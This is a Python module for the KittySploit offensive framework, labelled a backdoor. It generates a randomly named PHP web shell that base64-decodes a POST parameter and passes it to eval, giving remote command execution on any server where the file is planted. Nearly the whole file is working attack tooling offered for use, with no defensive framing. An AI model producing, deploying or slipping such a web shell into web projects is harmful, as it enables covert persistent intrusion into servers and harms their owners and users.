from kittysploit import *

class Module(Backdoor):
	
	__info__ = {
		'name': 'Shell Php POST',
		'description': 'Shell Php POST',
		'author': 'KittySploit Team',
		'listener': 'listeners/web/php_post',
		'session_type': SessionType.PHP,
		'arch': Arch.PHP,
	}

	param_name = OptString("kitty_shell", "param name for connect", True)

	def run(self):
		
		filename = self.random_text(8)+".php"
		data = f"""<?php
$data = $_POST['{self.param_name}'];
$d = base64_decode($data);
echo eval(base64_decode($data));
?>
"""

		self.write_out_dir(filename, data)
		print_success(f"Filename : {filename}")
